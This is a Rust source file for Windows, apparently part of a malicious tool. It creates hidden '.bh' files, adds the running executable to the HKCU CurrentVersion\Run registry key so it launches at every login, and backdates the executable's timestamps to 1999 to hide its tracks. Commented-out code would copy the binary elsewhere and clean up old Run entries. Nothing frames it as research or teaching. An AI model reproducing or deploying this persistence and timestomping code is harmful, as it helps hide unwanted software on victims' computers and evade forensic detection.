extern crate winapi;

// use winreg::enums::RegType::REG_BINARY;
use winreg::enums::{HKEY_CURRENT_USER, /*KEY_READ,*/ KEY_SET_VALUE};
use winreg::{RegKey, /*RegValue*/};
use std::os::windows::prelude::*;

use filetime::{set_file_times,FileTime};
use std::fs::*;
use std::io::*;

static AL_REGKEY: &str = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

// Create the file when compiled on Windows system
pub fn create_bloatfile(path: &str, name:String, data: Vec<u8>) -> Option<String>{	

	let path_file: String = format!("{}{}.bh",path,name);

	// Create a file with the hidden attribute
	/*
	let _ = File::options().create(true).write(true).attributes(winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN).open(&path_file).expect("Valid filepath").write_all(&data);

	return path_file
	*/


	let _ = match File::options().create(true).write(true).attributes(winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN).open(&path_file){
		Ok(mut file) => {
			let _ = file.write_all(&data);
			return Some(path_file);
		},
		Err(_err) => return None,

	};

}

// Adding persistence for the windows compilation
pub fn adding_persistence(exe_name: &str) -> std::io::Result<()>{
	
	// Get the path to the executable when its executed
	let previous_exe_path = std::env::current_exe()?;

	/*
	// Create a path where the future exe will be
	let new_exe_path = format!("{}{}.exe",filepath,exe_name);

    let mut f ;
	let mut buffer:Vec<u8> = Vec::new();

	// Open the previous one and copy its content to the new one
    let file = match File::open(&previous_exe_path){
		Ok(mut file) => {
			let _ = file.read_to_end(&mut buffer);
			f = File::create(&new_exe_path).unwrap();
			let _ = f.write_all(&buffer);
		},
		Err(err) => {
			panic!("Failed to open the executable: {}", err),
		}

	};        
	
    println!("Created a copy of {} at {}", previous_exe_path.display(), new_exe_path);
	*/

	// Add the new exe to the registry to launch at startup
	let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        hkcu.open_subkey_with_flags(AL_REGKEY, KEY_SET_VALUE)?
            .set_value::<_, _>(
                &previous_exe_path,
                &str::replace(&previous_exe_path.as_path().display().to_string(), "/", r"\"),
            )?;

	// Change the modified and access date of the executable to 1999
	let _ = set_file_times(previous_exe_path, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));

	// Delete the old reg key from the previous exe created
	/*
	hkcu.open_subkey_with_flags(AL_REGKEY, KEY_SET_VALUE)?
    .delete_value(&previous_exe_path)?;
	*/

	

	Ok(())
}
